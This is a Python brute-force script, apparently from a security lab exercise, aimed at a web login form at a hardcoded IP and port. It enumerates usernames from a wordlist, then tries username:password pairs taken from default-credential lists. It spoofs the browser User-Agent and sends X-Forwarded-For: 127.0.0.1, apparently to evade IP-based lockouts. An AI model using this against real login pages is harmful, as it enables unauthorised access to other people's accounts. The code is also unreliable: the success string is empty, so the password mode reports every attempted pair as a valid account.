import sys
import requests
import os.path

# define target url, change as needed
url = "http://94.237.56.76:53697/question2/"

# define a fake headers to present ourself as Chromium browser, change if needed
#headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}
headers = {
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
  "X-Forwarded-For": "127.0.0.1"
}

# define the string expected if valid account has been found. our basic PHP example replies with Welcome in case of success

valid = ''
invalid = "wronguser"

"""
wordlist is expected as CSV with field like: Vendor,User,Password,Comment
for this test we are using SecLists' Passwords/Default-Credentials/default-passwords.csv
change this function if your wordlist has a different format
"""
def unpack(fline):
    # get user
    userid = fline.split(":")[0]
    # Keeps passwords with ":" in them
    passwd = ":".join(fline.split(":")[1:])

    return userid, passwd

"""
our PHP example accepts requests via POST, and requires parameters as userid and passwd
"""
def do_req(url, userid, passwd, headers):
    # Make sure that data json keys have correct POST Data value: Username=input1&Password=input2
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)

    return res.text

"""
if defined valid string is found in response body return True
"""
def check(haystack, needle):
    if needle in haystack:
        return True
    else:
        return False

def main():
    # check if this script has been runned with an argument, and the argument exists and is a file
    if (len(sys.argv) > 2) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
        mode = sys.argv[2]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist mode\n\nmode 1: bruteforce usernames\nmode 2: bruteforce username:passwords".format(sys.argv[0]))
        sys.exit()
    print ("Mode: ", mode)
    if (mode == "1"):
        print("[%] Bruteforcing Usernames")
        # read user and password
        with open(fname, "r") as fh:
            for fline in fh:
                # skip comment
                if fline.startswith("#"):
                    continue
                # take username
                username = fline.strip("\n")
                print(username)

                # prepare GET data
                # url = "http://83.136.252.24:37919/question1/?Username={}&Password=123".format(username)
                #print(url)

                # do GET request
                # res = requests.get(url, headers=headers)

                # prepare POST data23
                
                data = {
                    "Username": username,
                    "wronguser": "",
                    "count": "1",
                    "Password": "123",
                }

                # do POST request
                res = requests.post(url, data=data)

                # Check for needle in haystack
                if (check(res.text, invalid)):
                    print("[-] Invalid Username: {}".format(username))
                elif (not check(res.text, invalid)):
                    print("[+] Valid Username:{}".format(username)) 
                
    elif (mode == "2"):
        print("[%] Bruteforcing Username:Passwords")    
        # open the file, this is our wordlist
        with open(fname) as fh:
            # read file line by line
            for fline in fh:
                # skip line if it starts with a comment
                if fline.startswith("#"):
                    continue
                # use unpack() function to extract userid and password from wordlist, removing trailing newline
                userid, passwd = unpack(fline.rstrip())
    
                # call do_req() to do the HTTP request
                print("[-] Checking account {} {}".format(userid, passwd))
                res = do_req(url, userid, passwd, headers)
    
                # call function check() to verify if HTTP response text matches our content
                if (check(res, valid)):
                    print("[+] Valid account found: Username:{} Password:{}".format(userid, passwd))

if __name__ == "__main__":
    main()
